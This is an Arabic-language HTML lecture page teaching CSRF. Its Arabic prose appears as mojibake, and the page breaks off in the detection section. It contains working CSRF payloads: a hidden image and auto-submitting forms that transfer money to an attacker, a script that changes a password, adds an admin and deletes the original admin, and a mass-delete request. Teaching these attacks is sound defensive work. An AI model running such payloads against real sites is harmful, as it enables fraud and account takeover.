<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cross-site Request Forgery (CSRF) - Ù…Ø­Ø§Ø¶Ø±Ø© Ø´Ø§Ù…Ù„Ø©</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Google Sans', 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            line-height: 1.6;
            color: #e8eaed;
            background: #151b2f;
            min-height: 100vh;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            text-align: center;
            margin-bottom: 48px;
            padding: 64px 24px;
            background: linear-gradient(135deg, #1a2125, #203942);
            border-radius: 12px;
            box-shadow: 0 4px 24px rgb(33, 48, 70);
        }

        .header h1 {
            font-size: 2.5rem;
            font-weight: 400;
            color: #e8eaed;
            margin-bottom: 16px;
            letter-spacing: -0.5px;
        }

        .header p {
            font-size: 1.1rem;
            font-weight: 300;
            color: rgba(232, 234, 237, 0.9);
            margin-bottom: 24px;
        }

        .content {
            background: #0f1724;
            border: 1px solid #2b3447;
            border-radius: 12px;
            padding: 24px;
            margin-bottom: 24px;
            box-shadow: 0 1px 6px rgba(33, 48, 70, 0.3);
        }

        .section {
            margin-bottom: 40px;
            padding: 20px;
            border-left: 4px solid #a5b4fc;
            background: #1a2332;
            border-radius: 12px;
        }

        .section h2 {
            color: #a5b4fc;
            margin-bottom: 15px;
            font-size: 1.8rem;
            font-weight: 400;
        }

        .section h3 {
            color: #495057;
            margin: 20px 0 10px 0;
            font-size: 1.4rem;
        }

        .attack-type {
            background: #0c1220;
            border: 2px solid #263148;
            border-radius: 12px;
            padding: 20px;
            margin: 15px 0;
            transition: all 0.3s ease;
        }

        .attack-type:hover {
            border-color: #a5b4fc;
            box-shadow: 0 4px 16px rgba(165, 180, 252, 0.12);
            transform: translateY(-2px);
        }

        .attack-type h4 {
            color: #dc3545;
            margin-bottom: 10px;
            font-size: 1.2rem;
            font-weight: 500;
        }

        .code-block {
            background: #2d3748;
            color: #e2e8f0;
            padding: 20px;
            border-radius: 8px;
            margin: 15px 0;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
        }

        .code-block.vulnerable {
            border-left: 4px solid #dc3545;
        }

        .code-block.secure {
            border-left: 4px solid #28a745;
        }

        .lab-card {
            background: linear-gradient(135deg, #1e3a8a, #1e40af);
            border: 1px solid #3b82f6;
            color: white;
            padding: 20px;
            border-radius: 12px;
            margin: 15px 0;
            transition: all 0.3s ease;
        }

        .lab-card:hover {
            transform: translateY(-2px);
        }

        .lab-card h4 {
            margin-bottom: 10px;
            font-size: 1.2rem;
        }

        .lab-card a {
            color: #ffd700;
            text-decoration: none;
            font-weight: bold;
        }

        .lab-card a:hover {
            text-decoration: underline;
        }

        .comparison-table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            background: white;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        .comparison-table th,
        .comparison-table td {
            padding: 12px;
            text-align: right;
            border-bottom: 1px solid #e9ecef;
        }

        .comparison-table th {
            background: #667eea;
            color: white;
            font-weight: bold;
        }

        .comparison-table tr:nth-child(even) {
            background: #f8f9fa;
        }

        .comparison-table tr:hover {
            background: #e9ecef;
        }

        .warning {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            color: #856404;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
        }

        .info {
            background: #d1ecf1;
            border: 1px solid #bee5eb;
            color: #0c5460;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
        }

        .success {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            color: #155724;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
        }

        .mermaid {
            text-align: center;
            margin: 20px 0;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 8px;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }

        .stat-card {
            background: linear-gradient(135deg, #1e3a8a, #1e40af);
            border: 1px solid #3b82f6;
            color: white;
            padding: 20px;
            border-radius: 12px;
            text-align: center;
            transition: all 0.3s ease;
        }

        .stat-card:hover {
            transform: translateY(-2px);
        }

        .stat-card h3 {
            font-size: 2rem;
            margin-bottom: 5px;
        }

        .stat-card p {
            opacity: 0.9;
        }

        .back-button {
            display: inline-block;
            background: linear-gradient(135deg, #1e3a8a, #1e40af);
            color: white;
            padding: 12px 24px;
            text-decoration: none;
            border-radius: 8px;
            margin-bottom: 20px;
            transition: all 0.3s ease;
            font-weight: 500;
            border: 1px solid #3b82f6;
        }

        .back-button:hover {
            transform: translateY(-1px);
        }

        @media (max-width: 768px) {
            .container {
                padding: 10px;
            }
            
            .header h1 {
                font-size: 2rem;
            }
            
            .content {
                padding: 20px;
            }
            
            .code-block {
                font-size: 0.8rem;
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <a href="../../index.html" class="back-button">â† Ø§Ù„Ø¹ÙˆØ¯Ø© Ù„Ù„ØµÙØ­Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©</a>
        
        <div class="header">
            <h1>ğŸ”’ Cross-site Request Forgery (CSRF)</h1>
            <p>Ù…Ø­Ø§Ø¶Ø±Ø© Ø´Ø§Ù…Ù„Ø© Ø¹Ù† Ø«ØºØ±Ø§Øª CSRF ÙˆØ£Ù†ÙˆØ§Ø¹Ù‡Ø§ ÙˆØ·Ø±Ù‚ Ø§Ù„Ø­Ù…Ø§ÙŠØ©</p>
        </div>

        <div class="content">
            <!-- Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª Ø³Ø±ÙŠØ¹Ø© -->
            <div class="stats">
                <div class="stat-card">
                    <h3>5</h3>
                    <p>Ø£Ù†ÙˆØ§Ø¹ CSRF</p>
                </div>
                <div class="stat-card">
                    <h3>8</h3>
                    <p>Ù…Ø®ØªØ¨Ø± Ø¹Ù…Ù„ÙŠ</p>
                </div>
                <div class="stat-card">
                    <h3>2</h3>
                    <p>Ø³Ø§Ø¹Ø© ØªØ¯Ø±ÙŠØ¨ÙŠØ©</p>
                </div>
                <div class="stat-card">
                    <h3>15+</h3>
                    <p>Ù…Ø«Ø§Ù„ Ø¹Ù…Ù„ÙŠ</p>
                </div>
            </div>

            <!-- Ù…Ù‚Ø¯Ù…Ø© -->
            <div class="section">
                <h2>ğŸ¯ Ù…Ø§ Ù‡ÙŠ CSRFØŸ</h2>
                <p>
                    <strong>Cross-site Request Forgery (CSRF)</strong> Ù‡ÙŠ Ø«ØºØ±Ø© Ø£Ù…Ù†ÙŠØ© ØªØ³Ù…Ø­ Ù„Ù„Ù…Ù‡Ø§Ø¬Ù… Ø¨Ø¥Ø¬Ø¨Ø§Ø± Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ø¹Ù„Ù‰ ØªÙ†ÙÙŠØ° Ø¥Ø¬Ø±Ø§Ø¡Ø§Øª ØºÙŠØ± Ù…Ø±ØºÙˆØ¨ ÙÙŠÙ‡Ø§ Ø¹Ù„Ù‰ Ù…ÙˆÙ‚Ø¹ ÙˆÙŠØ¨ ÙŠÙƒÙˆÙ†ÙˆÙ† Ù…Ø³Ø¬Ù„ÙŠÙ† ÙÙŠÙ‡ Ø¨Ø§Ù„ÙØ¹Ù„. 
                    Ù‡Ø°Ù‡ Ø§Ù„Ù‡Ø¬Ù…Ø§Øª ØªØ¹ØªÙ…Ø¯ Ø¹Ù„Ù‰ Ø­Ù‚ÙŠÙ‚Ø© Ø£Ù† Ø§Ù„Ù…ØªØµÙØ­ ÙŠØ±Ø³Ù„ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø§Ù„ÙƒÙˆÙƒÙŠØ² Ù…Ø¹ ÙƒÙ„ Ø·Ù„Ø¨ Ø¥Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹.
                </p>
                
                <div class="info">
                    <strong>ğŸ’¡ Ù…Ø«Ø§Ù„ Ø¨Ø³ÙŠØ·:</strong> Ø¥Ø°Ø§ ÙƒÙ†Øª Ù…Ø³Ø¬Ù„ Ø§Ù„Ø¯Ø®ÙˆÙ„ ÙÙŠ Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¨Ù†ÙƒØŒ ÙŠÙ…ÙƒÙ† Ù„Ù„Ù…Ù‡Ø§Ø¬Ù… Ø¥Ù†Ø´Ø§Ø¡ ØµÙØ­Ø© Ø®Ø¨ÙŠØ«Ø© ØªØ¬Ø¹Ù„Ùƒ ØªØ­ÙˆÙ„ Ø£Ù…ÙˆØ§Ù„Ùƒ Ø¥Ù„Ù‰ Ø­Ø³Ø§Ø¨Ù‡ Ø¯ÙˆÙ† Ø¹Ù„Ù…Ùƒ!
                </div>

                <div class="mermaid">
                    <h3>ğŸ“Š Ø¢Ù„ÙŠØ© Ø¹Ù…Ù„ CSRF</h3>
                    <p><strong>1.</strong> Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ø³Ø¬Ù„ ÙÙŠ Ù…ÙˆÙ‚Ø¹ Ø¢Ù…Ù† (Ù…Ø«Ù„ Ø§Ù„Ø¨Ù†Ùƒ)</p>
                    <p><strong>2.</strong> Ø§Ù„Ù…Ù‡Ø§Ø¬Ù… ÙŠØ±Ø³Ù„ Ø±Ø§Ø¨Ø· Ø®Ø¨ÙŠØ« Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù…</p>
                    <p><strong>3.</strong> Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙŠÙØªØ­ Ø§Ù„Ø±Ø§Ø¨Ø· (Ø¨ÙŠÙ†Ù…Ø§ Ù„Ø§ ÙŠØ²Ø§Ù„ Ù…Ø³Ø¬Ù„ ÙÙŠ Ø§Ù„Ø¨Ù†Ùƒ)</p>
                    <p><strong>4.</strong> Ø§Ù„Ù…ØªØµÙØ­ ÙŠØ±Ø³Ù„ Ø·Ù„Ø¨ ØªÙ„Ù‚Ø§Ø¦ÙŠ Ù…Ø¹ Ø§Ù„ÙƒÙˆÙƒÙŠØ²</p>
                    <p><strong>5.</strong> Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙŠØ¹Ø§Ù„Ø¬ Ø§Ù„Ø·Ù„Ø¨ ÙƒØ£Ù†Ù‡ Ù…Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù†ÙØ³Ù‡!</p>
                </div>
            </div>

            <!-- Ø£Ù†ÙˆØ§Ø¹ CSRF -->
            <div class="section">
                <h2>ğŸ” Ø£Ù†ÙˆØ§Ø¹ CSRF</h2>
                
                <!-- 1. GET-based CSRF -->
                <div class="attack-type">
                    <h4>1. GET-based CSRF</h4>
                    <p>ØªØ­Ø¯Ø« Ø¹Ù†Ø¯Ù…Ø§ ÙŠØªÙ… ØªÙ†ÙÙŠØ° Ù‡Ø¬ÙˆÙ… CSRF Ø¹Ø¨Ø± Ø·Ù„Ø¨ GET. Ù‡Ø°Ù‡ Ø§Ù„Ø·Ø±ÙŠÙ‚Ø© Ø¨Ø³ÙŠØ·Ø© ÙˆÙ„ÙƒÙ†Ù‡Ø§ Ù…Ø­Ø¯ÙˆØ¯Ø©.</p>
                    
                    <h5>ğŸ“ Ù…Ø«Ø§Ù„ Ø¹Ù„Ù‰ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø¶Ø¹ÙŠÙ:</h5>
                    <div class="code-block vulnerable">
&lt;!-- âŒ ÙƒÙˆØ¯ Ø¶Ø¹ÙŠÙ --&gt;
&lt;a href="https://bank.com/transfer?to=attacker&amount=1000"&gt;
    Ø¹Ø±Ø¶ ØµÙˆØ±Ø© Ø¬Ù…ÙŠÙ„Ø©
&lt;/a&gt;

&lt;!-- Ø£Ùˆ Ø¹Ø¨Ø± img tag --&gt;
&lt;img src="https://bank.com/transfer?to=attacker&amount=1000" 
     style="display:none;"&gt;
                    </div>

                    <h5>ğŸ¯ ÙƒÙŠÙ ÙŠØ¹Ù…Ù„ Ø§Ù„Ù‡Ø¬ÙˆÙ…:</h5>
                    <ul>
                        <li>Ø§Ù„Ù…Ù‡Ø§Ø¬Ù… ÙŠÙ†Ø´Ø¦ Ø±Ø§Ø¨Ø· Ø£Ùˆ ØµÙˆØ±Ø© Ø®ÙÙŠØ©</li>
                        <li>Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙŠÙØªØ­ Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ø®Ø¨ÙŠØ«Ø©</li>
                        <li>Ø§Ù„Ù…ØªØµÙØ­ ÙŠØ±Ø³Ù„ Ø·Ù„Ø¨ GET ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹</li>
                        <li>Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙŠØ¹Ø§Ù„Ø¬ Ø§Ù„Ø·Ù„Ø¨ Ù…Ø¹ Ø§Ù„ÙƒÙˆÙƒÙŠØ²</li>
                    </ul>

                    <h5>âš ï¸ Ø§Ù„Ù‚ÙŠÙˆØ¯:</h5>
                    <ul>
                        <li>Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø¹Ù‚Ø¯Ø©</li>
                        <li>Ø§Ù„Ø·Ù„Ø¨Ø§Øª ØªØ¸Ù‡Ø± ÙÙŠ Ø³Ø¬Ù„ Ø§Ù„Ù…ØªØµÙØ­</li>
                        <li>Ø³Ù‡Ù„Ø© Ø§Ù„Ø§ÙƒØªØ´Ø§Ù</li>
                    </ul>
                </div>

                <!-- 2. POST-based CSRF -->
                <div class="attack-type">
                    <h4>2. POST-based CSRF</h4>
                    <p>ØªØ­Ø¯Ø« Ø¹Ù†Ø¯Ù…Ø§ ÙŠØªÙ… ØªÙ†ÙÙŠØ° Ù‡Ø¬ÙˆÙ… CSRF Ø¹Ø¨Ø± Ø·Ù„Ø¨ POST. Ù‡Ø°Ù‡ Ø§Ù„Ø·Ø±ÙŠÙ‚Ø© Ø£ÙƒØ«Ø± ØªØ¹Ù‚ÙŠØ¯Ø§Ù‹ ÙˆÙ„ÙƒÙ†Ù‡Ø§ Ø£Ù‚ÙˆÙ‰.</p>
                    
                    <h5>ğŸ“ Ù…Ø«Ø§Ù„ Ø¹Ù„Ù‰ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø¶Ø¹ÙŠÙ:</h5>
                    <div class="code-block vulnerable">
&lt;!-- âŒ ÙƒÙˆØ¯ Ø¶Ø¹ÙŠÙ --&gt;
&lt;form id="csrf-form" action="https://bank.com/transfer" method="POST"&gt;
    &lt;input type="hidden" name="to" value="attacker"&gt;
    &lt;input type="hidden" name="amount" value="1000"&gt;
&lt;/form&gt;

&lt;script&gt;
// ØªÙ†ÙÙŠØ° Ø§Ù„Ù†Ù…ÙˆØ°Ø¬ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹
document.getElementById('csrf-form').submit();
&lt;/script&gt;
                    </div>

                    <h5>ğŸ¯ ÙƒÙŠÙ ÙŠØ¹Ù…Ù„ Ø§Ù„Ù‡Ø¬ÙˆÙ…:</h5>
                    <ul>
                        <li>Ø§Ù„Ù…Ù‡Ø§Ø¬Ù… ÙŠÙ†Ø´Ø¦ Ù†Ù…ÙˆØ°Ø¬ Ù…Ø®ÙÙŠ</li>
                        <li>ÙŠØ³ØªØ®Ø¯Ù… JavaScript Ù„ØªÙ†ÙÙŠØ° Ø§Ù„Ù†Ù…ÙˆØ°Ø¬</li>
                        <li>Ø§Ù„Ù…ØªØµÙØ­ ÙŠØ±Ø³Ù„ Ø·Ù„Ø¨ POST Ù…Ø¹ Ø§Ù„ÙƒÙˆÙƒÙŠØ²</li>
                        <li>Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙŠØ¹Ø§Ù„Ø¬ Ø§Ù„Ø·Ù„Ø¨ ÙƒØ£Ù†Ù‡ Ù…Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…</li>
                    </ul>

                    <h5>ğŸ’ª Ø§Ù„Ù…Ù…ÙŠØ²Ø§Øª:</h5>
                    <ul>
                        <li>ÙŠÙ…ÙƒÙ† Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø¹Ù‚Ø¯Ø©</li>
                        <li>Ø§Ù„Ø·Ù„Ø¨Ø§Øª Ù„Ø§ ØªØ¸Ù‡Ø± ÙÙŠ Ø³Ø¬Ù„ Ø§Ù„Ù…ØªØµÙØ­</li>
                        <li>Ø£ØµØ¹Ø¨ ÙÙŠ Ø§Ù„Ø§ÙƒØªØ´Ø§Ù</li>
                    </ul>
                </div>

                <!-- 3. JSON-based CSRF -->
                <div class="attack-type">
                    <h4>3. JSON-based CSRF</h4>
                    <p>ØªØ­Ø¯Ø« Ø¹Ù†Ø¯Ù…Ø§ ÙŠØªÙ… ØªÙ†ÙÙŠØ° Ù‡Ø¬ÙˆÙ… CSRF Ø¹Ø¨Ø± Ø·Ù„Ø¨ JSON. Ù‡Ø°Ù‡ Ø§Ù„Ø·Ø±ÙŠÙ‚Ø© Ø­Ø¯ÙŠØ«Ø© ÙˆØªØ³ØªÙ‡Ø¯Ù APIs.</p>
                    
                    <h5>ğŸ“ Ù…Ø«Ø§Ù„ Ø¹Ù„Ù‰ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø¶Ø¹ÙŠÙ:</h5>
                    <div class="code-block vulnerable">
&lt;!-- âŒ ÙƒÙˆØ¯ Ø¶Ø¹ÙŠÙ --&gt;
&lt;script&gt;
fetch('https://api.bank.com/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        to: 'attacker',
        amount: 1000
    })
});
&lt;/script&gt;
                    </div>

                    <h5>ğŸ¯ ÙƒÙŠÙ ÙŠØ¹Ù…Ù„ Ø§Ù„Ù‡Ø¬ÙˆÙ…:</h5>
                    <ul>
                        <li>Ø§Ù„Ù…Ù‡Ø§Ø¬Ù… ÙŠÙ†Ø´Ø¦ Ø·Ù„Ø¨ fetch Ø£Ùˆ XMLHttpRequest</li>
                        <li>ÙŠØ±Ø³Ù„ Ø¨ÙŠØ§Ù†Ø§Øª JSON Ù…Ø¹ Ø§Ù„Ø·Ù„Ø¨</li>
                        <li>Ø§Ù„Ù…ØªØµÙØ­ ÙŠØ±Ø³Ù„ Ø§Ù„ÙƒÙˆÙƒÙŠØ² ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹</li>
                        <li>API ÙŠØ¹Ø§Ù„Ø¬ Ø§Ù„Ø·Ù„Ø¨</li>
                    </ul>

                    <h5>âš ï¸ Ø§Ù„Ù‚ÙŠÙˆØ¯:</h5>
                    <ul>
                        <li>Ù‚Ø¯ ØªØ­ØªØ§Ø¬ CORS headers</li>
                        <li>Ø¨Ø¹Ø¶ Ø§Ù„Ù…ØªØµÙØ­Ø§Øª ØªÙ…Ù†Ø¹Ù‡Ø§</li>
                        <li>Ù‚Ø¯ ØªØ­ØªØ§Ø¬ preflight requests</li>
                    </ul>
                </div>

                <!-- 4. Multi-step CSRF -->
                <div class="attack-type">
                    <h4>4. Multi-step CSRF</h4>
                    <p>ØªØ­Ø¯Ø« Ø¹Ù†Ø¯Ù…Ø§ ÙŠØªØ·Ù„Ø¨ Ø§Ù„Ø¥Ø¬Ø±Ø§Ø¡ Ø¹Ø¯Ø© Ø®Ø·ÙˆØ§Øª Ù…ØªØªØ§Ù„ÙŠØ©. Ø§Ù„Ù…Ù‡Ø§Ø¬Ù… ÙŠÙ†ÙØ° Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø®Ø·ÙˆØ§Øª ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹.</p>
                    
                    <h5>ğŸ“ Ù…Ø«Ø§Ù„ Ø¹Ù„Ù‰ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø¶Ø¹ÙŠÙ:</h5>
                    <div class="code-block vulnerable">
&lt;!-- âŒ ÙƒÙˆØ¯ Ø¶Ø¹ÙŠÙ --&gt;
&lt;script&gt;
// Ø§Ù„Ø®Ø·ÙˆØ© 1: ØªØºÙŠÙŠØ± ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±
fetch('/change-password', {
    method: 'POST',
    body: 'newPassword=hacked123'
});

// Ø§Ù„Ø®Ø·ÙˆØ© 2: Ø¥Ø¶Ø§ÙØ© Ù…Ø³ØªØ®Ø¯Ù… Ø¬Ø¯ÙŠØ¯
setTimeout(() =&gt; {
    fetch('/add-user', {
        method: 'POST',
        body: 'username=attacker&role=admin'
    });
}, 1000);

// Ø§Ù„Ø®Ø·ÙˆØ© 3: Ø­Ø°Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø§Ù„Ø£ØµÙ„ÙŠ
setTimeout(() =&gt; {
    fetch('/delete-user', {
        method: 'POST',
        body: 'username=admin'
    });
}, 2000);
&lt;/script&gt;
                    </div>

                    <h5>ğŸ¯ ÙƒÙŠÙ ÙŠØ¹Ù…Ù„ Ø§Ù„Ù‡Ø¬ÙˆÙ…:</h5>
                    <ul>
                        <li>Ø§Ù„Ù…Ù‡Ø§Ø¬Ù… ÙŠÙ†ÙØ° Ø¹Ø¯Ø© Ø·Ù„Ø¨Ø§Øª Ù…ØªØªØ§Ù„ÙŠØ©</li>
                        <li>ÙŠØ³ØªØ®Ø¯Ù… setTimeout Ù„Ù„ØªÙˆÙ‚ÙŠØª</li>
                        <li>ÙƒÙ„ Ø·Ù„Ø¨ ÙŠØ¹ØªÙ…Ø¯ Ø¹Ù„Ù‰ Ø§Ù„Ø·Ù„Ø¨ Ø§Ù„Ø³Ø§Ø¨Ù‚</li>
                        <li>Ø§Ù„Ù†ØªÙŠØ¬Ø©: Ø³ÙŠØ·Ø±Ø© ÙƒØ§Ù…Ù„Ø© Ø¹Ù„Ù‰ Ø§Ù„Ù†Ø¸Ø§Ù…</li>
                    </ul>

                    <h5>ğŸ’ª Ø§Ù„Ù…Ù…ÙŠØ²Ø§Øª:</h5>
                    <ul>
                        <li>ÙŠÙ…ÙƒÙ† ØªÙ†ÙÙŠØ° Ø¹Ù…Ù„ÙŠØ§Øª Ù…Ø¹Ù‚Ø¯Ø©</li>
                        <li>Ø£ØµØ¹Ø¨ ÙÙŠ Ø§Ù„Ø§ÙƒØªØ´Ø§Ù</li>
                        <li>ÙŠÙ…ÙƒÙ† ØªØ¬Ø§ÙˆØ² Ø¨Ø¹Ø¶ Ø§Ù„Ø­Ù…Ø§ÙŠØ©</li>
                    </ul>
                </div>

                <!-- 5. Blind CSRF -->
                <div class="attack-type">
                    <h4>5. Blind CSRF</h4>
                    <p>ØªØ­Ø¯Ø« Ø¹Ù†Ø¯Ù…Ø§ Ù„Ø§ ÙŠÙ…ÙƒÙ† Ù„Ù„Ù…Ù‡Ø§Ø¬Ù… Ø±Ø¤ÙŠØ© Ù†ØªÙŠØ¬Ø© Ø§Ù„Ø·Ù„Ø¨ØŒ ÙˆÙ„ÙƒÙ† Ø§Ù„Ø·Ù„Ø¨ ÙŠØªÙ… ØªÙ†ÙÙŠØ°Ù‡ Ø¨Ù†Ø¬Ø§Ø­.</p>
                    
                    <h5>ğŸ“ Ù…Ø«Ø§Ù„ Ø¹Ù„Ù‰ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø¶Ø¹ÙŠÙ:</h5>
                    <div class="code-block vulnerable">
&lt;!-- âŒ ÙƒÙˆØ¯ Ø¶Ø¹ÙŠÙ --&gt;
&lt;script&gt;
// Ø·Ù„Ø¨ Ù„Ø§ ÙŠØ¹ÙŠØ¯ Ø§Ø³ØªØ¬Ø§Ø¨Ø© Ù…Ø±Ø¦ÙŠØ©
fetch('/admin/delete-all-users', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        confirm: true
    })
}).then(response =&gt; {
    // Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø±Ø¤ÙŠØ© Ø§Ù„Ù†ØªÙŠØ¬Ø©
    console.log('Request sent');
});
&lt;/script&gt;
                    </div>

                    <h5>ğŸ¯ ÙƒÙŠÙ ÙŠØ¹Ù…Ù„ Ø§Ù„Ù‡Ø¬ÙˆÙ…:</h5>
                    <ul>
                        <li>Ø§Ù„Ù…Ù‡Ø§Ø¬Ù… ÙŠØ±Ø³Ù„ Ø·Ù„Ø¨ Ø¯ÙˆÙ† Ø±Ø¤ÙŠØ© Ø§Ù„Ù†ØªÙŠØ¬Ø©</li>
                        <li>Ø§Ù„Ø·Ù„Ø¨ ÙŠØªÙ… ØªÙ†ÙÙŠØ°Ù‡ ÙÙŠ Ø§Ù„Ø®Ù„ÙÙŠØ©</li>
                        <li>Ø§Ù„Ù†ØªÙŠØ¬Ø© ØªØ­Ø¯Ø« Ø¹Ù„Ù‰ Ø§Ù„Ø®Ø§Ø¯Ù…</li>
                        <li>Ø§Ù„Ù…Ù‡Ø§Ø¬Ù… Ù„Ø§ ÙŠØ¹Ø±Ù Ø¥Ø°Ø§ Ù†Ø¬Ø­ Ø§Ù„Ø·Ù„Ø¨</li>
                    </ul>

                    <h5>âš ï¸ Ø§Ù„ØªØ­Ø¯ÙŠØ§Øª:</h5>
                    <ul>
                        <li>ØµØ¹ÙˆØ¨Ø© Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ù†Ø¬Ø§Ø­ Ø§Ù„Ù‡Ø¬ÙˆÙ…</li>
                        <li>Ù‚Ø¯ ØªØ­ØªØ§Ø¬ Ø·Ù„Ø¨Ø§Øª Ø¥Ø¶Ø§ÙÙŠØ© Ù„Ù„ØªØ­Ù‚Ù‚</li>
                        <li>Ø£ØµØ¹Ø¨ ÙÙŠ Ø§Ù„ØªØ·ÙˆÙŠØ± ÙˆØ§Ù„Ø§Ø®ØªØ¨Ø§Ø±</li>
                    </ul>
                </div>
            </div>

            <!-- Ù…Ù‚Ø§Ø±Ù†Ø© Ø¨ÙŠÙ† Ø§Ù„Ø£Ù†ÙˆØ§Ø¹ -->
            <div class="section">
                <h2>ğŸ“Š Ù…Ù‚Ø§Ø±Ù†Ø© Ø¨ÙŠÙ† Ø£Ù†ÙˆØ§Ø¹ CSRF</h2>
                
                <table class="comparison-table">
                    <thead>
                        <tr>
                            <th>Ø§Ù„Ù†ÙˆØ¹</th>
                            <th>Ø§Ù„ØªØ¹Ù‚ÙŠØ¯</th>
                            <th>Ø§Ù„Ø§ÙƒØªØ´Ø§Ù</th>
                            <th>Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª</th>
                            <th>Ø§Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>GET-based</strong></td>
                            <td>Ù…Ù†Ø®ÙØ¶</td>
                            <td>Ø³Ù‡Ù„</td>
                            <td>Ù…Ø­Ø¯ÙˆØ¯Ø©</td>
                            <td>Ø¨Ø³ÙŠØ·Ø©</td>
                        </tr>
                        <tr>
                            <td><strong>POST-based</strong></td>
                            <td>Ù…ØªÙˆØ³Ø·</td>
                            <td>Ù…ØªÙˆØ³Ø·</td>
                            <td>ØºÙŠØ± Ù…Ø­Ø¯ÙˆØ¯Ø©</td>
                            <td>Ø´Ø§Ø¦Ø¹Ø©</td>
                        </tr>
                        <tr>
                            <td><strong>JSON-based</strong></td>
                            <td>Ù…ØªÙˆØ³Ø·</td>
                            <td>ØµØ¹Ø¨</td>
                            <td>Ù…Ø¹Ù‚Ø¯Ø©</td>
                            <td>APIs</td>
                        </tr>
                        <tr>
                            <td><strong>Multi-step</strong></td>
                            <td>Ø¹Ø§Ù„ÙŠ</td>
                            <td>ØµØ¹Ø¨ Ø¬Ø¯Ø§Ù‹</td>
                            <td>Ù…ØªØ¹Ø¯Ø¯Ø©</td>
                            <td>Ù…ØªÙ‚Ø¯Ù…Ø©</td>
                        </tr>
                        <tr>
                            <td><strong>Blind</strong></td>
                            <td>Ù…ØªÙˆØ³Ø·</td>
                            <td>ØµØ¹Ø¨</td>
                            <td>Ù…Ø­Ø¯ÙˆØ¯Ø©</td>
                            <td>ØªØ®Ø±ÙŠØ¨ÙŠØ©</td>
                        </tr>
                    </tbody>
                </table>
            </div>

            <!-- Ø·Ø±Ù‚ Ø§Ù„Ø§ÙƒØªØ´Ø§Ù -->
            <div class="section">
                <h2>ğŸ” Ø·Ø±Ù‚ Ø§ÙƒØªØ´Ø§Ù CSRF</h2>
                
                <h3>1. Ø§Ù„ÙØ­Øµ Ø§Ù„ÙŠØ¯ÙˆÙŠ</h3>
                <div class="code-block">
&lt;!-- Ø§Ø®ØªØ¨Ø§Ø± GET-based CSRF --&gt;
&lt;img src="https://target.com/action?param=value" style="display:none;"&gt;

&lt;!-- Ø§Ø®ØªØ¨Ø§Ø± POST-based CSRF --&gt;
&lt;form action="https://target.com/action" method="POST"&gt;
    &lt;input type="hidden" name="param" value="value"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
                </div>

                <h3>2. Ø§Ø³ØªØ®Ø¯Ø§Ù… Burp Suite</h3>
                <ul>
                    <li>Ø§Ø³ØªØ®Ø¯Ø§Ù… CSRF PoC Generator</li>
                    <li>ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø·Ù„Ø¨Ø§Øª ÙˆØ§Ù„Ø±Ø¯ÙˆØ¯</li>
